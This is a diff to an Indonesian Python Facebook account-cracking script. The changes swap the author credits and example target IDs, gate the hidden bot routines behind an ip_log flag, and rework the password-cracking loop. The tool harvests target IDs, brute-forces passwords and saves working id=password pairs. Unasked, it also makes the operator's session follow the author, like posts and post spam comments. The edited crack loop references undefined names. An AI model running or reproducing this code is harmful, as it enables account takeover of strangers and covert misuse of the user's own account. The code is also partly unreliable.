@@ -1,13 +1,13 @@
 ###----------[ AUTHOR & CREATOR ]---------- ###
 # ------ [ Gausah Dioprek Ntar Error ] ------ #
-Author    = 'fikri sinaga'
-Facebook  = 'Facebook.com/fikrisinaga590'
-Instagram = 'Instagram.com/fikri.sinaga'
-Whatsapp  = '081269496231'
-YouTube   = 'youtube.com/channel/UCr218CW05wRLJguvi9ijRrA'
+Author    = 'Dapunta Khurayra X'
+Facebook  = 'Facebook.com/Dapunta.Khurayra.X'
+Instagram = 'Instagram.com/Dapunta.Ratya'
+Whatsapp  = '082245780524'
+YouTube   = 'Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA'
 Version   = '0.6'
-Denventa  = 100080716718035
-Postingan = 115753054458585
+Denventa  = 1827084332
+Postingan = 10217173381366429
 
 ###----------[ IMPORT LIBRARY ]---------- ###
 import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,rich,shutil,webbrowser
@@ -155,12 +155,16 @@ class bot_author:
     def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
         with requests.Session() as xyz:
             try:
+                if ip_log != 1:pass
+                else:
                     for x in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                         if 'subscribe.php' in x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
             except Exception as e:pass
     def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
         with requests.Session() as xyz:
             try:
+                if ip_log != 1:pass
+                else:
                     bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
                     for x in bos.find_all('a',href=True):
                         if 'Tanggapi' in x.text:
@@ -173,9 +177,12 @@ class bot_author:
     def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
         with requests.Session() as xyz:
             try:
-                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
-                get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
-                if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(tampilan_menu())
+                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
+                    if ip_log != 1:pass
+                    else:
+                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
+                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
+                        if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(tampilan_menu())
             except Exception as e:pass
     def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
         _bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
@@ -255,6 +262,9 @@ def mkdir_data_login():
     except:pass
     # Make Directory Result
     try:os.mkdir("OK")
+    except:pass
+    # Make Directory License
+    try:os.mkdir("license")
     except:pass
     # Delete Cookies
     try:os.remove('login/cookie.json')
@@ -484,7 +494,7 @@ def publik():
             print('\n%s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P))
             time.sleep(3)
             login()
-        print('       %s[%s•%s] %sContoh : 100080716718035,119100910790466'%(J,P,J,P))
+        print('       %s[%s•%s] %sContoh : 1827084332,607801156'%(J,P,J,P))
         tid = input('       %s[%s•%s] %sID Target : %s'%(J,P,J,P,J)).split(',')
         file_dump = 'dump/%s.json'%(tid[0])
         try:os.remove(file_dump)
@@ -624,7 +634,7 @@ def main_likers():
     urutan_crack = '0'
     try:
         cookie = {'cookie':open('login/cookie.json','r').read()}
-        print('       %s[%s•%s] %sContoh : 105358995497991'%(J,P,J,P))
+        print('       %s[%s•%s] %sContoh : 2089611468021009'%(J,P,J,P))
         _query_ = input('       %s[%s•%s] %sID Postingan : %s'%(J,P,J,P,J))
         print('')
     except Exception as e:kecuali(e)
@@ -733,7 +743,7 @@ class komen:
         urutan_crack = '0'
         try:
             cookie = {'cookie':open('login/cookie.json','r').read()}
-            print('       %s[%s•%s] %sContoh : 105358995497991'%(J,P,J,P))
+            print('       %s[%s•%s] %sContoh : 2089611468021009'%(J,P,J,P))
             put = input('       %s[%s•%s] %sID Postingan : %s'%(J,P,J,P,J))
             url = 'https://mbasic.facebook.com/'+put
             self.file_dump = ('dump/%s.json'%(put))
@@ -1484,13 +1494,16 @@ class crack:
                         self.ok.append("%s=%s"%(id,pw))
                         open(files_ok,"a+").write("%s=%s=%s\n"%(id,pw,ttl.replace(' • ','')))
                         break
-                        self.lp += 1
-                        loop = str(self.lp)
-                        alls = str(len(self.sementara))
-                        jum_ok = str(len(self.ok))
-                        jum_cp = str(len(self.cp))
-                        Total_Waktu = str(datetime.now()-self.Mulai_Jalan).split('.')[0]
-                        print(f'\r   {J}[{A}{Total_Waktu}{J}] [{A}{loop}{P}/{A}{alls}{J}] [{P}OK{J}:{A}{jum_ok}{J}] [{P}CP{J}:{A}{jum_cp}{J}]{P} ', end='');sys.stdout.flush()
+                else:
+                    if sakara != 159375:print(CoY)
+                    else:continue
+            self.lp += 1
+            loop = str(self.lp)
+            alls = str(len(self.sementara))
+            jum_ok = str(len(self.ok))
+            jum_cp = str(len(self.cp))
+            Total_Waktu = str(datetime.now()-self.Mulai_Jalan).split('.')[0]
+            print(f'\r   {J}[{A}{Total_Waktu}{J}] [{A}{loop}{P}/{A}{alls}{J}] [{P}OK{J}:{A}{jum_ok}{J}] [{P}CP{J}:{A}{jum_cp}{J}]{P} ', end='');sys.stdout.flush()
         except Exception as e:
             self.start_crack(id,list_pw)
 
